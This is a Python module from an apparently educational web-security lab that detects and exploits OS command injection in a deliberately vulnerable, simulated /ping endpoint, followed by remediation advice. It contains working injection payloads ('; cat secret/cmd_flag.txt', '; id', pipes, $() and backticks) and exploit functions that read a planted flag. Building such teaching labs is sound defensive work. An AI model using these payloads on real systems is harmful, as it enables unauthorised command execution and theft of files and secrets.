"""OS Command Injection -- detect, exploit, and remediate.

WHAT IT IS
----------
An OS Command Injection flaw is what you get when an application builds a shell
command string out of *untrusted input* and hands it to a shell. Because the
shell interprets metacharacters (``;`` ``|`` ``&&`` ``||`` backticks ``$()``)
*before* running the program, an attacker who controls part of the string can
terminate the intended command and chain commands of their own choosing -- with
the privileges of the web process. The demo app's ``/ping`` handler is the
textbook example::

    def ping(self):                                    # GET /ping?host=<v>
        host = self._query().get("host", "127.0.0.1")  # attacker-controlled
        output = simulate_shell(f"ping -c1 {host}", ...)  # input spliced into shell
        return f"<pre>{output}</pre>"

Because ``host`` is concatenated straight into ``ping -c1 <host>`` and the result
is parsed by a shell, the value ``127.0.0.1; id`` runs *two* commands: ``ping -c1
127.0.0.1`` and then ``id``. A benign ``host=127.0.0.1`` returns only ping
statistics; ``host=127.0.0.1; id`` *additionally* returns
``uid=33(www-data) ...`` -- output for a command the user never asked the app to
run, proving the input crossed from data into code. From there the attacker reads
any file the process can (``; cat secret/cmd_flag.txt`` -> the planted prize) and,
on a real host, escalates to a full interactive shell / pivot.

NOTE: the lab uses a SIMULATED shell. The metacharacter parsing
(:func:`weblab.targetapp.sim_shell.simulate_shell`) and the command outputs are
faithfully reproduced -- the injection mechanics are real and observable -- but
attacker-controlled input NEVER reaches a real ``os.system`` / ``subprocess`` on
the host. The lesson lands without spawning a process from user input.

HOW WE DISCOVER IT
------------------
We confirm the sink with layered, differential signals:

1. **The benign baseline.** ``host=127.0.0.1`` returns only ping statistics and
   echoes the host back inside ``PING 127.0.0.1: ...``. This proves the parameter
   reaches the command and anchors what "no injection" looks like.
2. **The unique-sentinel echo.** ``host=127.0.0.1; echo <canary>`` makes the shell
   run ``echo`` and print our random token on its own line. A safe app would treat
   the whole string as a hostname and never emit the bare token -- so seeing the
   canary (and NOT as part of an error message) proves an arbitrary second command
   executed. The token is random per run, so a page that merely happened to
   contain "id" can't fool the detector.
3. **The ``id`` fingerprint.** ``host=127.0.0.1; id`` returns
   ``uid=33(www-data) ...`` -- the canonical "which user am I?" probe, confirming
   we run with the web process's identity.

HOW WE EXPLOIT IT
-----------------
We request ``host=127.0.0.1; cat secret/cmd_flag.txt`` and recover the planted
secret the web process can read: ``C.FLAGS["command_injection"]``. We ALSO
demonstrate ``host=127.0.0.1; id`` to show arbitrary command execution as
``www-data``. In the real world this same breakout primitive reads
``/etc/passwd``, exfiltrates application secrets/credentials, opens reverse
shells, and pivots into the internal network.

THE FIX
-------
See :data:`REMEDIATION`. In one line: never build shell strings from untrusted
input -- avoid the shell entirely (pass an argument *vector* to ``exec``/
``subprocess`` with ``shell=False``), or, where a shell is unavoidable, strictly
allow-list/validate the input and escape it -- and run with least privilege.
"""
from __future__ import annotations

import os
import uuid
from typing import List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Never construct an OS command string out of untrusted input. The root cause "
    "here is concatenating user data into a shell command (f\"ping -c1 {host}\") "
    "that is then interpreted by a shell, so metacharacters (; | && || `` $()) "
    "break out and run attacker commands. The primary fix is to avoid the shell "
    "altogether: call the program directly with an ARGUMENT VECTOR and shell "
    "disabled -- e.g. subprocess.run(['ping', '-c1', host], shell=False) -- so the "
    "user value can only ever be a single argument, never command syntax. Better "
    "still, do not shell out at all when a library exists (use a native ICMP/socket "
    "API instead of /bin/ping). Strictly validate and allow-list the input against "
    "the narrow grammar it should match (e.g. a hostname or IP via a strict regex / "
    "ipaddress parse) and reject anything else; never rely on blacklisting "
    "metacharacters, which is bypassable. If a shell is truly unavoidable, escape "
    "every interpolated value with shlex.quote() as defence-in-depth. Run the "
    "service as a least-privilege, sandboxed user so that even a successful "
    "injection yields minimal access, and log/alert on rejected input. Separate "
    "data from code: pass arguments, validate strictly, and drop the shell."
)

#: The command-injection sink, used as the Finding endpoint.
ENDPOINT: str = "/ping?host="

#: A benign host: returns only ping statistics, no injected command output.
#: The control that anchors what "no injection" looks like.
BENIGN_HOST: str = "127.0.0.1"

#: The headline working exploit: chain ``cat`` after ping with ``;`` to read the
#: planted secret file the web process can access.
WORKING_PAYLOAD: str = "127.0.0.1; cat secret/cmd_flag.txt"

#: The classic privilege/identity probe -- ``id`` run via the same ``;`` breakout.
#: Returns ``uid=33(www-data) ...`` and proves arbitrary command execution.
ID_PAYLOAD: str = "127.0.0.1; id"

#: The marker ``id`` emits, proving we run as the web process user.
ID_MARKER: str = "uid=33(www-data)"


def _load_payloads() -> List[str]:
    """Load the command-injection payloads from the data file (one per line)."""
    path = os.path.join(os.path.dirname(__file__), "data", "cmdi_payloads.txt")
    payloads: List[str] = []
    try:
        with open(path, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.rstrip("\n")
                if not line.strip() or line.lstrip().startswith("#"):
                    continue
                payloads.append(line)
    except OSError:
        # Fall back to the in-code essentials so the engine still works if the
        # data file is missing.
        payloads = [
            ID_PAYLOAD,
            WORKING_PAYLOAD,
            "127.0.0.1 | id",
            "127.0.0.1 && cat secret/cmd_flag.txt",
            "127.0.0.1 $(cat secret/cmd_flag.txt)",
            "`id`",
        ]
    return payloads


#: Every payload the engine knows about (loaded once at import). Public so the
#: CLI / report can show exactly what was attempted.
PAYLOADS: List[str] = _load_payloads()


# --- low-level probe ---------------------------------------------------------
def _ping(client: WebClient, host_value: str) -> Response:
    """Request ``/ping?host=<host_value>`` (the client URL-encodes the value)."""
    return client.get("/ping", params={"host": host_value})


def _command_output(resp: Response) -> str:
    """Strip the ``<pre>...</pre>`` chrome the demo wraps command output in.

    Returns the inner combined command output so detectors can match on the
    shell's actual stdout rather than the surrounding HTML.
    """
    text = resp.text
    if "<pre>" in text and "</pre>" in text:
        return text.split("<pre>", 1)[1].rsplit("</pre>", 1)[0]
    return text


# --- detection ---------------------------------------------------------------
def detect_baseline(client: WebClient) -> Tuple[bool, str]:
    """True if a benign host returns ping output WITHOUT any injected command.

    The control: ``host=127.0.0.1`` returns ping statistics (and echoes the host
    inside ``PING 127.0.0.1: ...``) but no ``uid=`` / shell output. This proves
    the parameter reaches the command and anchors the "no injection" baseline.
    """
    resp = _ping(client, BENIGN_HOST)
    out = _command_output(resp)
    if (
        resp.status == 200
        and f"PING {BENIGN_HOST}" in out
        and ID_MARKER not in out
    ):
        return True, (
            f"GET {ENDPOINT}{BENIGN_HOST} returned only ping statistics "
            f"(HTTP {resp.status}) -- the host reaches the command, and no "
            "injected output appears without a metacharacter"
        )
    return False, ""


def detect_command_injection(client: WebClient) -> Tuple[bool, str]:
    """True if a ``; echo <canary>`` breakout runs an arbitrary second command.

    Injects ``host=127.0.0.1; echo <random-token>``. A safe app treats the whole
    value as a hostname and never prints the bare token; a vulnerable shell runs
    ``echo`` and emits the token on its own line. The token is random per call, so
    a page that merely happens to contain a common word cannot masquerade as a
    vulnerable sink. We also require the benign baseline NOT to contain the token.
    """
    canary = "weblab-cmdi-" + uuid.uuid4().hex[:12]
    payload = f"{BENIGN_HOST}; echo {canary}"
    resp = _ping(client, payload)
    out = _command_output(resp)
    # The echoed token must appear on its own (not merely as part of the host
    # echo, which would read "PING 127.0.0.1; echo <canary>: ..." if NOT split).
    token_on_own_line = any(line.strip() == canary for line in out.splitlines())
    if resp.status == 200 and token_on_own_line:
        return True, (
            f"GET {ENDPOINT}{payload} ran an injected `echo` and returned the "
            f"random token {canary!r} on its own line -- the `;` broke out of the "
            "ping command and a second command executed"
        )
    return False, ""


def detect_id_execution(client: WebClient) -> Tuple[bool, str]:
    """True if ``; id`` returns ``uid=33(www-data) ...`` -- the identity probe.

    Sends ``host=127.0.0.1; id`` and expects the ``id`` output, proving we run
    arbitrary commands with the web process's identity (the foothold the exploit
    weaponises to read files).
    """
    resp = _ping(client, ID_PAYLOAD)
    out = _command_output(resp)
    if resp.status == 200 and ID_MARKER in out:
        return True, (
            f"GET {ENDPOINT}{ID_PAYLOAD} returned {ID_MARKER!r} -- arbitrary "
            "command execution as the web process user (www-data)"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def exploit_read_secret_file(
    client: WebClient, payload: str = WORKING_PAYLOAD
) -> Tuple[bool, Optional[str], str]:
    """Read ``secret/cmd_flag.txt`` via the ``;`` breakout and recover the flag.

    Returns ``(ok, flag, command_output)``. On success the command output
    contains the planted ``C.FLAGS["command_injection"]`` -- proof we ran an
    attacker-chosen ``cat`` as the web process.
    """
    resp = _ping(client, payload)
    out = _command_output(resp)
    if resp.status != 200 or C.FLAGS["command_injection"] not in out:
        return False, None, out
    return True, C.FLAGS["command_injection"], out


def exploit_run_id(client: WebClient) -> Tuple[bool, str]:
    """Demonstrate arbitrary command execution: run ``id`` via the breakout.

    Returns ``(ok, command_output)``; on success the output carries the
    ``uid=33(www-data) ...`` identity line.
    """
    resp = _ping(client, ID_PAYLOAD)
    out = _command_output(resp)
    return (resp.status == 200 and ID_MARKER in out), out


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect OS command injection, then exploit it (read the secret + run ``id``).

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["command_injection"]`` and whose ``extra`` records the ``id`` proof
    of arbitrary command execution as ``www-data``.
    """
    techniques: List[str] = []

    # 1) Detection ----------------------------------------------------------
    baseline_ok, baseline_ev = detect_baseline(client)
    if baseline_ok:
        techniques.append("benign-baseline")
    inject_ok, inject_ev = detect_command_injection(client)
    if inject_ok:
        techniques.append("sentinel-echo")
    id_ok, id_ev = detect_id_execution(client)
    if id_ok:
        techniques.append("id-fingerprint")

    # 2) Exploitation -------------------------------------------------------
    ok, flag, cmd_out = exploit_read_secret_file(client)
    if ok:
        techniques.append("read-secret-file")
    run_id_ok, id_out = exploit_run_id(client)
    if run_id_ok:
        techniques.append("run-id")

    # Discovery requires a confirmed breakout (the sentinel echo) AND the secret
    # to have been recovered via an injected `cat`.
    discovered = bool(inject_ok and ok)

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if baseline_ok:
        evidence_parts.append(f"baseline: {baseline_ev}")
    if inject_ok:
        evidence_parts.append(f"injection: {inject_ev}")
    if id_ok:
        evidence_parts.append(f"identity: {id_ev}")
    evidence = " || ".join(evidence_parts)

    # Isolate just the injected command's line(s) for the result summary.
    leaked_line = C.FLAGS["command_injection"]
    for line in cmd_out.splitlines():
        if C.FLAGS["command_injection"] in line:
            leaked_line = line.strip()
            break

    exploit_result = {
        "flag": flag,
        "payload": WORKING_PAYLOAD,
        "command": "cat secret/cmd_flag.txt",
        "command_output": cmd_out,
        "leaked": leaked_line,
        "id_payload": ID_PAYLOAD,
        "id_output": id_out if run_id_ok else "",
        "techniques": techniques,
        "summary": (
            f"GET {ENDPOINT}{WORKING_PAYLOAD} chained `cat secret/cmd_flag.txt` "
            f"after ping; recovered flag {flag!r} (and `id` -> www-data)"
        ),
    }

    return Finding(
        vuln="OS Command Injection",
        endpoint=ENDPOINT,
        severity=Severity.CRITICAL.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=WORKING_PAYLOAD,
        extra={
            "techniques": techniques,
            "benign_baseline_ok": baseline_ok,
            "command_injection_confirmed": inject_ok,
            "id_execution_ok": id_ok,
            "flag_recovered": ok,
            "id_demonstrated": run_id_ok,
            "working_payload": WORKING_PAYLOAD,
            "id_payload": ID_PAYLOAD,
            "id_marker": ID_MARKER,
            "process_identity": ID_MARKER if run_id_ok else "",
            "breakout_operator": ";",
        },
    )
